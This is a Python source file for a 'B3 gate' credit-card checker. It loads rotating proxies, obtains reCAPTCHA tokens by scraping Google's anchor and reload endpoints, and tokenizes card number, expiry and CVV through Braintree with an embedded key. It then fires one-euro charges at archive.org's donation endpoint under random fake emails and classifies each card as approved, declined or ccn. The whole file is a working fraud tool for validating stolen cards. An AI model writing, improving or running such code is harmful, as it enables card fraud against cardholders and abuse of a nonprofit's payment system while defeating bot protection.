import aiohttp
import asyncio
import base64
import json
import random
import string
import os
import logging
import requests
from aiohttp_socks import ProxyConnector

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def sanitize_error_message(error_str):
    """Remove proxy URLs and credentials from error messages"""
    import re
    sanitized = re.sub(r"url='[^']*'", "url='[PROXY]'", str(error_str))
    sanitized = re.sub(r'http://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    sanitized = re.sub(r'https://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    if '407' in sanitized:
        return "Proxy authentication failed"
    return sanitized

TIMEOUT = 45
CHARGE_AMOUNT = 1
SITEKEY = '6Ld64a8UAAAAAGbDwi1927ztGNw7YABQ-dqzvTN2'
BRAINTREE_AUTH = 'production_x6ffdgk2_pqd7hz44swp6zvvw'

class B3Processor:
    def __init__(self):
        self.proxy_pool = []
        self.proxy_index = 0
        self.request_timeout = aiohttp.ClientTimeout(total=TIMEOUT)

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            random.shuffle(self.proxy_pool)
            logger.info(f"Loaded {len(self.proxy_pool)} proxies for B3 Gate")

    def get_next_proxy(self):
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self.proxy_index % len(self.proxy_pool)]
        self.proxy_index += 1
        return proxy

    def get_proxy_connector(self):
        proxy = self.get_next_proxy()
        if proxy:
            if not proxy.startswith('http'):
                proxy = f'http://{proxy}'
            return ProxyConnector.from_url(proxy)
        return None

processor = B3Processor()
processor.load_proxies()

def get_recaptcha_token():
    try:
        co_value = base64.b64encode(b'https://archive.org:443').decode().rstrip('=')
        anchor_url = f'https://www.google.com/recaptcha/api2/anchor?ar=1&k={SITEKEY}&co={co_value}&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible'
        reload_url = f'https://www.google.com/recaptcha/api2/reload?k={SITEKEY}'
        
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0'})
        
        r1 = session.get(anchor_url, timeout=30)
        if 'recaptcha-token' not in r1.text:
            return None
        
        token1 = r1.text.split('recaptcha-token" value="')[1].split('">')[0]
        payload = f'v=pCoGBhjs9s8EhFOHJFe8cqis&reason=q&c={token1}&k={SITEKEY}&co={co_value}&hl=en&size=invisible'
        
        r2 = session.post(reload_url, data=payload, headers={'content-type': 'application/x-www-form-urlencoded'}, timeout=30)
        
        if '"rresp","' in r2.text:
            return r2.text.split('"rresp","')[1].split('"')[0]
        return None
    except Exception as e:
        logger.error(f"[B3] reCAPTCHA error: {e}")
        return None

async def b3_tokenize(cc, mm, yy, cvv):
    try:
        headers = {
            'authorization': f'Bearer {BRAINTREE_AUTH}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
        }
        json_data = {
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }
        
        async with aiohttp.ClientSession(timeout=processor.request_timeout) as session:
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data) as response:
                data = await response.json()
                
                if 'data' in data and data['data']:
                    d = data['data']['tokenizeCreditCard']
                    return {
                        'nonce': d['token'], 
                        'mm': d['creditCard']['expirationMonth'], 
                        'yy': d['creditCard']['expirationYear'], 
                        'bin': d['creditCard']['bin'], 
                        'type': d['creditCard']['brandCode'], 
                        'last4': d['creditCard']['last4'], 
                        'binData': d['creditCard']['binData']
                    }
        return None
    except Exception as e:
        logger.error(f"[B3] Tokenize error: {e}")
        return None

async def b3_charge(nonce, recaptcha_token):
    try:
        json_data = {
            'paymentProvider': 'braintree',
            'paymentMethodNonce': nonce,
            'amount': CHARGE_AMOUNT,
            'donationType': 'one-time',
            'coverFees': False,
            'email': f'user{random.randint(1000,9999)}@gmail.com',
            'recaptchaToken': recaptcha_token
        }
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://archive.org',
            'referer': 'https://archive.org/donate',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0',
        }
        
        connector = processor.get_proxy_connector()
        async with aiohttp.ClientSession(connector=connector, timeout=processor.request_timeout) as session:
            async with session.post('https://archive.org/services/donations/braintree-charge.php', headers=headers, json=json_data) as response:
                return await response.json()
    except Exception as e:
        error_msg = sanitize_error_message(str(e))
        logger.error(f"[B3] Charge error: {error_msg}")
        return {'error': error_msg, 'value': {'message': error_msg}}

async def check_card(cc, mm, yy, cvv):
    result = {
        'status': 'error',
        'message': 'Unknown error',
        'card': f'{cc}|{mm}|{yy}|{cvv}',
        'gate': 'B3'
    }
    
    try:
        if len(yy) == 2:
            yy = '20' + yy
        
        recaptcha = get_recaptcha_token()
        if not recaptcha:
            result['message'] = 'Failed to bypass reCAPTCHA'
            return result
        
        token_data = await b3_tokenize(cc, mm, yy, cvv)
        if not token_data:
            result['message'] = 'Failed to tokenize card'
            return result
        
        charge_result = await b3_charge(token_data['nonce'], recaptcha)
        
        if charge_result.get('success') == True and 'value' in charge_result and 'transaction_id' in charge_result.get('value', {}):
            result['status'] = 'approved'
            result['message'] = 'Charged -» €1'
            return result
        
        if 'value' in charge_result and 'message' in charge_result['value']:
            message = charge_result['value']['message']
        elif 'message' in charge_result:
            message = charge_result['message']
        elif 'error' in charge_result:
            message = charge_result['error']
        else:
            message = str(charge_result)
        
        result['message'] = message
        
        msg_lower = message.lower()
        if 'success' in msg_lower or 'thank' in msg_lower:
            result['status'] = 'approved'
        elif 'do not honor' in msg_lower or 'insufficient' in msg_lower or 'decline' in msg_lower:
            result['status'] = 'declined'
        elif 'cvv' in msg_lower or 'cvc' in msg_lower or 'security code' in msg_lower:
            result['status'] = 'ccn'
        elif 'expired' in msg_lower:
            result['status'] = 'declined'
        elif 'call issuer' in msg_lower or 'pick up' in msg_lower or 'restricted' in msg_lower:
            result['status'] = 'declined'
        elif 'no account' in msg_lower or 'invalid' in msg_lower:
            result['status'] = 'declined'
        elif 'error' in msg_lower or 'failed' in msg_lower:
            result['status'] = 'error'
        else:
            result['status'] = 'declined'
        
        return result
        
    except Exception as e:
        result['message'] = str(e)
        return result
